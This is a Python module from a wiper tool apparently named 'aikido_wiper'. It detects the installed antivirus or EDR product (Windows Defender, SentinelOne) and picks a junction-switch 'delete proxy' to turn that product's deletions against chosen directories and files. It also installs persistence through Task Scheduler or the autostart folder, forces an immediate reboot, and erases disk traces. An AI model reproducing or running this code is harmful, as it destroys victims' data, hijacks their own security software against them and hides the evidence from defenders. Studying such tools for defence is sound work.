import os

from aikido_wiper.indirect_ops.delete.microsoft_defender_delete_proxy import MicrosoftDefenderDeleteProxy
from aikido_wiper.indirect_ops.delete.sentinel_one_delete_proxy import SentinelOneDeleteProxy
from aikido_wiper.indirect_ops.delete.idelete_proxy import IDeleteProxy
from aikido_wiper.wipe_utils import get_all_dirs_under_dir, get_all_files_under_dir
from aikido_wiper.windows_utils import get_existing_anti_virus_display_names, task_scheduler_stay_persistent_with_args, autostart_stay_persistent_with_args


WMI_DISPLAY_NAMES_TO_PROXIES_ARG_NAMES_IN_FAVORED_ORDER = {
    "Sentinel Agent": SentinelOneDeleteProxy.__name__,
    "Windows Defender": MicrosoftDefenderDeleteProxy.__name__
}   

def parse_list_from_file(path: str) -> list[str]:
    """
    Parses a file which contains a list of strings separated by lines breaks.

    :param path: The path to the file to parse.
    :return: The list from the file.
    """
    out_list = []
    with open(path, "r") as f:
        for line in f.readlines():
            line_without_break = line.replace("\n", "")
            out_list.append(line_without_break)
    
    return out_list


def create_junction_switch_proxy(proxy_class: type, args) -> IDeleteProxy:
    """
    Creates a specific junction switch proxy based on the command line arguments.

    :param proxy_class: The class of the specific proxy to create.
    :param args: The command line arguments parsed by argparse.
    :return: The created proxy.
    """
    delete_proxy = proxy_class(decoy_dir_path=args.decoy_root_dir)
    return delete_proxy


def find_dirs_under_dir_from_args(args) -> set[str]:
    """
    Finds all the directories to try to delete based on the command line arguments.

    :param args: The command line arguments parsed by argparse.
    :return: The directories to delete 
    """
    paths_to_exclude = []
    if args.exclusion_list_path:
        paths_to_exclude = parse_list_from_file(args.exclusion_list_path)

    result = get_all_dirs_under_dir(args.root_path, paths_to_exclude)
    result.add(args.root_path)
    return result


def find_files_under_dir_from_args(args) -> set[str]:
    """
    Finds all the files to try to delete based on the command line arguments.

    :param args: The command line arguments parsed by argparse.
    :return: The files to delete 
    """
    paths_to_exclude = []
    if args.exclusion_list_path:
        paths_to_exclude = parse_list_from_file(args.exclusion_list_path)

    result = get_all_files_under_dir(args.root_path, paths_to_exclude)
    result.add(args.root_path)
    return result


def find_custom_paths_from_args(args) -> set[str]:
    """
    Parses the custom paths to delete file given in the command line arguments.

    :param args: The command line arguments parsed by argparse.
    :return: The paths to delete 
    """
    return parse_list_from_file(args.custom_paths_file)


def get_preferred_proxy_arg_name() -> str:
    """
    Decides which is the best deletion proxy to use based on the AV / EDR products
    installed on the system.

    :return: The string that identifies the preferred proxy to use in the command
        line arguments
    """
    existing_proxy_names = get_existing_anti_virus_display_names()
    
    preferred_proxy_arg_name = None
    for proxy_display_name, proxy_arg_name in WMI_DISPLAY_NAMES_TO_PROXIES_ARG_NAMES_IN_FAVORED_ORDER.items():
        if proxy_display_name in existing_proxy_names:
            preferred_proxy_arg_name = proxy_arg_name
            break
    
    if None == preferred_proxy_arg_name:
        return None

    return preferred_proxy_arg_name


def task_scheduler_reboot_erase_point():
    """
    Erases traces from the disk after a reboot using task scheduler for persistency.
    """
    task_scheduler_stay_persistent_with_args(cmd_args="-q ERASE_DISK_TRACES")
    os.system("shutdown -t 0 -r -f")

def autostart_reboot_erase_point():
    """
    Erases traces from the disk after a reboot using the current user's autostart
    directory for persistency.
    """
    autostart_stay_persistent_with_args(cmd_args="-q ERASE_DISK_TRACES")
    os.system("shutdown -t 0 -r -f")